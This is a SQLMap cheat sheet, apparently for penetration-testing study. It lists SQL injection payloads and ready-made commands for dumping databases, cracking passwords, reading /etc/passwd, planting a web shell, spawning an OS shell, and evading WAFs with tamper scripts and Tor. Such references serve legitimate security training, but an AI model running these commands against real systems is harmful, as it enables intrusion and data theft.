# SQLMap Essentials Cheat Sheet

## BEUSTQ 

BEUSTQ is SQLMap's default technique setting, representing SQLi types: 

- B (Boolean-based blind)
- E (Error-based)
- U (Union query-based)
- S (Stacked queries)
- T (Time-based blind)
- Q (Inline queries).

## SQL Injection Types

| Type                | Description                              | Example                          | Key Points                               |
|---------------------|------------------------------------------|----------------------------------|------------------------------------------|
| Boolean-Based Blind | Infers data via true/false responses.    | `AND 1=1`                        | Useful with no output; slow, character-by-character. |
| Error-Based         | Triggers errors to reveal data.          | `AND GTID_SUBSET(@@version,0)`   | Fast for chunks; requires visible errors. |
| Union Query-Based   | Appends results with UNION.              | `UNION ALL SELECT 1,@@version,3` | Fastest with direct output; needs column match. |
| Stacked Queries     | Executes multiple statements.            | `; DROP TABLE users`             | For non-query statements; DBMS-specific. |
| Time-Based Blind    | Delays response for inference.           | `AND 1=IF(2>1,SLEEP(5),0)`       | Useful with no response change; slower due to delays. |
| Inline Queries      | Embeds query within original.            | `SELECT (SELECT @@version) from` | Uncommon; for specific app structures.   |

## Commands

[SQLMap wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

**Note:** SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers, specify the "custom" injection mark after the header's value (e.g. --cookie="id=1*").

| Command | Description |
|---------|-------------|
| `sqlmap -h` | View the basic help menu |
| `sqlmap -hh` | View the advanced help menu |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` | Run SQLMap without asking for user input, id will be tested |
| `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'` | Run SQLMap with request headers, use copy as curl in developer tools and replace `curl` with `sqlmap` |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` | SQLMap with POST request, uid and name will be tested |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk, can be used within saved request file also |
| `sqlmap -r req.txt` | Passing an HTTP request file to SQLMap, right-click the request within Burp and choose Copy to file or Copy > Copy Request Headers in browser (can use JSON formatted and XML formatted HTTP requests, copy raw request from network tab in dev tools) |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap -u "http://www.example.com/?id=1" --random-agent` | Randomly select a User-agent header value or use `--mobile` switch to imitate the smartphone |
| `sqlmap -u www.target.com --data='id=1' --method PUT` | Specifying a PUT request |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3` | Specifying the level (boundaries used) and risk (vectors used) |
| `sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs` | Dump all databases excluding system databases |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration (version, current user/database name, if the current user has admin rights) |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration, specifying database name |
| `sqlmap -u "http://www.example.com/?id=1" --dump -D testdb` | Dump all tables |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb` | Dump whole table, specifying table and database name |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Only dump specified columns |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3` | Only dump specified rows |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --schema` | Database schema enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user` | Searching for all tables containing user |
| `sqlmap -u "http://www.example.com/?id=1" --search -C pass` | Searching for all columns containing pass |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user` | Searching for all tables containing user |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass |
| `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp` | Unique value bypass |
| `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"` | Calculated parameter bypass |
| `sqlmap --list-tampers` | List all tamper scripts |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell` | Spawning an OS shell |

## Tips

- Increase risk when testing login forms to use OR payloads
- The '--all' switch in combination with the '--batch' switch, will automaically do the whole enumeration process on the target itself, and provide the entire enumeration details. 

## Additional Flags

| Flag | Description |
|------|-------------|
| `--crawl`, `--forms` or `-g` | Used for automatic parameter finding |
| `--parse-errors` | Display errors |
| `--proxy` | Send requests through a proxy like burp |
| `--proxy-file` | work sequentially through a list of proxies |
| `--tor` | Use tor as a proxy, needs tor running locally |
| `--check-tor` | Check tor proxy configured correctly |
| `--code=200` | Test for specific HTTP response code |
| `--titles` | Base comparison on the content of the `<title>` tag |
| `--string=success` | Check for specific string value in response |
| `--not-string=error` | Check for the lack of specified string in response |
| `--text-only` | Removes all HTML tags from response, basing comparison on only textual content |
| `--technique=BEU` | Specify techniques used (default BEUSTQ) |
| `--union-cols=17` | Specify the number of columns used in union queries (if known) |
| `--union-char='a'` | Specify dummy values for union queries |
| `--union-from=users` | Specify the FROM appendix for union queries |
| `--no-cast` | Don't use casting (CAST(value AS CHAR)) |
| `--hex` | Hex encode database response |
| `--dump-format` | Specify format to dump table in, e.g. HTML or SQLite |
| `--skip-waf` | Skip WAF check test |
| `--chunked` | Request body into chunks, blacklisted SQL keywords are split between chunks |
| `--hpp` | Payloads are split between different same parameter named values which are concatenated by the target platform if supporting it (e.g. ASP) |

## Common SQLMap Tamper Scripts

| Tamper-Script            | Description                              |
|--------------------------|------------------------------------------|
| 0eunion                  | Replaces UNION with e0UNION              |
| base64encode             | Base64-encodes all payload characters    |
| between                  | Replaces > with NOT BETWEEN 0 AND #; = with BETWEEN # AND # |
| commalesslimit           | Replaces MySQL LIMIT M, N with LIMIT N OFFSET M |
| equaltolike              | Replaces = with LIKE                     |
| halfversionedmorekeywords | Adds MySQL versioned comment before keywords |
| modsecurityversioned     | Wraps query with MySQL versioned comment |
| modsecurityzeroversioned | Wraps query with MySQL zero-versioned comment |
| percentage               | Adds % before each character (e.g., SELECT -> %S%E%L%E%C%T) |
| plus2concat              | Replaces + with MsSQL CONCAT() function  |
| randomcase               | Randomizes case of keyword characters (e.g., SELECT -> SEleCt) |
| space2comment            | Replaces space with comment `/*`         |
| space2dash               | Replaces space with dash comment (--)    |
| space2hash               | Replaces space with MySQL # comment      |
| space2mssqlblank         | Replaces space with MsSQL blank character |
| space2plus               | Replaces space with plus (+)             |
| space2randomblank        | Replaces space with random blank character |
| symboliclogical          | Replaces AND/OR with &&/||               |
| versionedkeywords        | Wraps non-function keywords with MySQL comment |
| versionedmorekeywords    | Wraps all keywords with MySQL comment    |